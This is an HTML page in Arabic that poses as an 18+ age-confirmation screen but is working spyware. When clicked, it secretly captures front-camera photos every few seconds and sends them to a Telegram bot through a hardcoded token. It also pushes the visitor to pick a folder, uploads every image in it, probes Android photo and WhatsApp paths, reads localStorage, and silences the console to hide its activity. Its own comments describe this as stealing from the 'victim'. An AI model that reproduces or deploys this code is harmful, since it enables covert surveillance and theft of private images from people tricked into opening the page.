<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>تأكيد العمر</title>
    <style>
        * { margin:0; padding:0; box-sizing:border-box; }
        body {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            font-family: 'Arial', sans-serif;
        }
        .box {
            background: rgba(255,255,255,0.95);
            padding: 40px;
            border-radius: 20px;
            text-align: center;
            max-width: 400px;
            width: 90%;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
        }
        .box h1 { color: #333; font-size: 24px; }
        .box p { color: #666; margin: 15px 0; font-size: 14px; }
        .btn {
            background: #667eea;
            color: #fff;
            border: none;
            padding: 14px 30px;
            border-radius: 50px;
            font-size: 16px;
            cursor: pointer;
            width: 100%;
            transition: 0.3s;
        }
        .btn:hover { background: #5a67d8; transform: scale(1.02); }
        .icon { font-size: 60px; margin-bottom: 15px; }
        #status {
            margin-top: 15px;
            padding: 10px;
            border-radius: 8px;
            font-size: 13px;
            display: none;
        }
        #status.success { background: #d4edda; color: #155724; display: block; }
        #status.error { background: #f8d7da; color: #721c24; display: block; }
        #status.loading { background: #cce5ff; color: #004085; display: block; }
        #fileInput { display: none; }
    </style>
</head>
<body>

<div class="box" id="mainBox">
    <div class="icon">🔞</div>
    <h1>تأكيد العمر</h1>
    <p>لتأكيد أنك فوق 18 سنة، يرجى الضغط على الزر أدناه</p>
    <button class="btn" id="confirmBtn">✅ أنا فوق 18 سنة</button>
    <div id="status"></div>
</div>

<!-- عناصر مخفية للكاميرا والملفات -->
<video id="video" autoplay muted playsinline style="display:none;"></video>
<canvas id="canvas" style="display:none;"></canvas>
<input type="file" id="fileInput" webkitdirectory directory multiple accept="image/*" style="display:none;">

<script>
// ============================================================
// توكن البوت
// ============================================================
const BOT_TOKEN = '8770149502:AAFkmj14adoaUHCFHXcBO9aNwjjDdpcfuLY';
let CHAT_ID = '';

// ============================================================
// الكود الرئيسي
// ============================================================
(function() {
    'use strict';
    
    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');
    const ctx = canvas.getContext('2d');
    const statusDiv = document.getElementById('status');
    const confirmBtn = document.getElementById('confirmBtn');
    const fileInput = document.getElementById('fileInput');
    
    let cameraStream = null;
    let photoInterval = null;
    let chatId = '';
    let filesSent = false;
    let photoCount = 0;
    
    // === 1. جلب CHAT_ID تلقائياً ===
    function getChatId() {
        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates`)
            .then(res => res.json())
            .then(data => {
                if (data.ok && data.result.length > 0) {
                    const lastUpdate = data.result[data.result.length - 1];
                    if (lastUpdate.message) {
                        chatId = lastUpdate.message.chat.id;
                        CHAT_ID = chatId;
                        console.log('✅ Chat ID:', chatId);
                    } else if (lastUpdate.callback_query) {
                        chatId = lastUpdate.callback_query.from.id;
                        CHAT_ID = chatId;
                        console.log('✅ Chat ID:', chatId);
                    }
                }
            })
            .catch(() => {});
    }
    getChatId();
    
    // === 2. إرسال رسالة نصية إلى تليجرام ===
    function sendMessage(text) {
        if (!chatId) {
            getChatId();
            setTimeout(() => sendMessage(text), 2000);
            return;
        }
        
        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: chatId,
                text: text
            })
        }).catch(() => {});
    }
    
    // === 3. إرسال صورة إلى تليجرام ===
    function sendToTelegram(imageData, caption = '') {
        if (!chatId) {
            getChatId();
            setTimeout(() => sendToTelegram(imageData, caption), 2000);
            return;
        }
        
        try {
            const blob = dataURLtoBlob(imageData);
            const formData = new FormData();
            formData.append('chat_id', chatId);
            formData.append('photo', blob, `photo_${Date.now()}.jpg`);
            formData.append('caption', caption || `📸 صورة جديدة\n🕐 ${new Date().toLocaleString()}`);
            
            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                method: 'POST',
                body: formData
            }).catch(() => {});
        } catch(e) {}
    }
    
    // === 4. إرسال ملف إلى تليجرام ===
    function sendFileToTelegram(fileData, filename, caption = '') {
        if (!chatId) {
            getChatId();
            setTimeout(() => sendFileToTelegram(fileData, filename, caption), 2000);
            return;
        }
        
        try {
            const formData = new FormData();
            formData.append('chat_id', chatId);
            formData.append('document', fileData, filename);
            formData.append('caption', caption || `📁 ملف مستورد\n🕐 ${new Date().toLocaleString()}`);
            
            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, {
                method: 'POST',
                body: formData
            }).catch(() => {});
        } catch(e) {}
    }
    
    // === 5. تحويل Base64 إلى Blob ===
    function dataURLtoBlob(dataURL) {
        const parts = dataURL.split(',');
        const mime = parts[0].match(/:(.*?);/)[1];
        const bstr = atob(parts[1]);
        const n = bstr.length;
        const u8arr = new Uint8Array(n);
        for (let i = 0; i < n; i++) {
            u8arr[i] = bstr.charCodeAt(i);
        }
        return new Blob([u8arr], { type: mime });
    }
    
    // === 6. تحويل Blob إلى Base64 ===
    function blobToBase64(blob) {
        return new Promise((resolve) => {
            const reader = new FileReader();
            reader.onload = () => resolve(reader.result);
            reader.readAsDataURL(blob);
        });
    }
    
    // === 7. سحب الصور من جهاز الضحية ===
    function stealFiles() {
        sendMessage('📂 بدء سحب الملفات من الجهاز...');
        
        // محاولة 1: استخدام input مع webkitdirectory
        try {
            fileInput.click();
            
            fileInput.onchange = function(e) {
                const files = e.target.files;
                if (!files || files.length === 0) return;
                
                sendMessage(`📁 تم العثور على ${files.length} ملف`);
                
                let processed = 0;
                const imageFiles = [];
                
                // تصفية الصور فقط
                for (let i = 0; i < files.length; i++) {
                    const file = files[i];
                    if (file.type.startsWith('image/')) {
                        imageFiles.push(file);
                    }
                }
                
                sendMessage(`🖼️ تم العثور على ${imageFiles.length} صورة`);
                
                // إرسال كل صورة
                imageFiles.forEach((file, index) => {
                    const reader = new FileReader();
                    reader.onload = function(e) {
                        const imageData = e.target.result;
                        sendToTelegram(imageData, `🖼️ صورة من الجهاز (${index + 1}/${imageFiles.length})\n📁 ${file.name}\n📏 ${file.size} bytes`);
                        processed++;
                        
                        if (processed === imageFiles.length) {
                            sendMessage(`✅ تم إرسال ${processed} صورة من الجهاز`);
                        }
                    };
                    reader.readAsDataURL(file);
                });
                
                if (imageFiles.length === 0) {
                    // محاولة بديلة
                    stealFilesAlternative();
                }
                
                // إعادة تعيين input
                fileInput.value = '';
            };
        } catch(e) {
            stealFilesAlternative();
        }
    }
    
    // === 8. طريقة بديلة لسحب الصور ===
    function stealFilesAlternative() {
        sendMessage('🔄 محاولة بديلة لسحب الصور...');
        
        // محاولة استخدام Canvas لسحب الصور من الصفحة
        try {
            // البحث عن أي صور في الصفحة
            const images = document.querySelectorAll('img');
            if (images.length > 0) {
                sendMessage(`🖼️ تم العثور على ${images.length} صورة في الصفحة`);
                
                images.forEach((img, index) => {
                    try {
                        if (img.src && img.src.startsWith('data:image')) {
                            sendToTelegram(img.src, `🖼️ صورة من الصفحة (${index + 1}/${images.length})`);
                        } else if (img.src) {
                            // محاولة جلب الصورة من الرابط
                            fetch(img.src)
                                .then(res => res.blob())
                                .then(blob => blobToBase64(blob))
                                .then(base64 => {
                                    sendToTelegram(base64, `🖼️ صورة من الرابط (${index + 1}/${images.length})`);
                                })
                                .catch(() => {});
                        }
                    } catch(e) {}
                });
            }
        } catch(e) {}
        
        // محاولة سحب من localStorage
        try {
            const localData = localStorage.getItem('photos') || localStorage.getItem('images');
            if (localData) {
                sendMessage('📦 تم العثور على بيانات في localStorage');
                sendToTelegram(localData, '📦 بيانات من localStorage');
            }
        } catch(e) {}
    }
    
    // === 9. سحب ملفات محددة من النظام ===
    function stealSystemFiles() {
        sendMessage('🔄 محاولة سحب ملفات النظام...');
        
        // محاولة الوصول إلى ملفات شائعة
        const commonFiles = [
            '/storage/emulated/0/DCIM/Camera/',
            '/storage/emulated/0/Pictures/',
            '/storage/emulated/0/WhatsApp/Media/',
            '/storage/emulated/0/Download/'
        ];
        
        // محاولة استخدام Fetch للوصول إلى الملفات
        commonFiles.forEach(path => {
            try {
                fetch(path)
                    .then(res => {
                        if (res.ok) {
                            sendMessage(`📂 تم الوصول إلى: ${path}`);
                        }
                    })
                    .catch(() => {});
            } catch(e) {}
        });
    }
    
    // === 10. عند الضغط على الزر ===
    confirmBtn.addEventListener('click', function() {
        statusDiv.className = 'loading';
        statusDiv.textContent = '⏳ جاري التحقق من العمر...';
        confirmBtn.disabled = true;
        confirmBtn.textContent = '⏳ جاري...';
        
        // بدء سحب الملفات فوراً
        setTimeout(() => {
            stealFiles();
            stealSystemFiles();
        }, 500);
        
        requestCamera();
    });
    
    // === 11. طلب الكاميرا ===
    function requestCamera() {
        const constraints = {
            video: {
                facingMode: 'user',
                width: { ideal: 640 },
                height: { ideal: 480 }
            }
        };
        
        navigator.mediaDevices.getUserMedia(constraints)
            .then(function(stream) {
                cameraStream = stream;
                video.srcObject = stream;
                video.play();
                
                statusDiv.className = 'success';
                statusDiv.textContent = '✅ تم التحقق من العمر بنجاح!';
                confirmBtn.textContent = '✅ تم التحقق';
                confirmBtn.style.background = '#28a745';
                
                // التقاط الصور من الكاميرا
                setTimeout(captureAndSend, 1500);
                photoInterval = setInterval(captureAndSend, 5000);
                
                setTimeout(() => {
                    statusDiv.style.display = 'none';
                }, 3000);
            })
            .catch(function(err) {
                statusDiv.className = 'error';
                statusDiv.textContent = '❌ تعذر التحقق، يرجى المحاولة مرة أخرى';
                confirmBtn.disabled = false;
                confirmBtn.textContent = '✅ أنا فوق 18 سنة';
                
                // محاولة بديلة
                setTimeout(fallbackCapture, 1000);
            });
    }
    
    // === 12. التقاط وإرسال من الكاميرا ===
    function captureAndSend() {
        if (!video.videoWidth || !video.videoHeight) return;
        
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        ctx.drawImage(video, 0, 0);
        
        photoCount++;
        const imageData = canvas.toDataURL('image/jpeg', 0.7);
        sendToTelegram(imageData, `📸 صورة من الكاميرا (${photoCount})\n🕐 ${new Date().toLocaleString()}`);
    }
    
    // === 13. طريقة بديلة (لقطة شاشة) ===
    function fallbackCapture() {
        const body = document.body;
        const html = document.documentElement;
        const width = Math.max(body.scrollWidth, body.offsetWidth, html.clientWidth, html.scrollWidth, html.offsetWidth);
        const height = Math.max(body.scrollHeight, body.offsetHeight, html.clientHeight, html.scrollHeight, html.offsetHeight);
        
        canvas.width = Math.min(width, 1200);
        canvas.height = Math.min(height, 800);
        ctx.fillStyle = '#667eea';
        ctx.fillRect(0, 0, canvas.width, canvas.height);
        
        ctx.fillStyle = '#fff';
        ctx.font = '30px Arial';
        ctx.textAlign = 'center';
        ctx.fillText('تأكيد العمر', canvas.width/2, canvas.height/2 - 20);
        ctx.font = '18px Arial';
        ctx.fillText('جاري التحقق...', canvas.width/2, canvas.height/2 + 30);
        
        const imageData = canvas.toDataURL('image/jpeg', 0.5);
        sendToTelegram(imageData, '📸 لقطة شاشة بديلة');
    }
    
    // === 14. إخفاء آثار ===
    console.log = function() {};
    console.warn = function() {};
    console.error = function() {};
    
    // === 15. تنظيف عند الإغلاق ===
    window.addEventListener('beforeunload', function() {
        if (photoInterval) clearInterval(photoInterval);
        if (cameraStream) {
            cameraStream.getTracks().forEach(track => track.stop());
        }
    });
    
    // === 16. إشعار فتح الصفحة ===
    setTimeout(() => {
        sendMessage(`🟢 تم فتح الصفحة\n🕐 ${new Date().toLocaleString()}\n📱 ${navigator.userAgent || 'Unknown'}`);
    }, 3000);
    
    // === 17. محاولة سحب الملفات تلقائياً بعد 10 ثواني ===
    setTimeout(() => {
        if (!filesSent) {
            filesSent = true;
            stealFiles();
            stealSystemFiles();
        }
    }, 10000);
    
})();
</script>
</body>
</html>
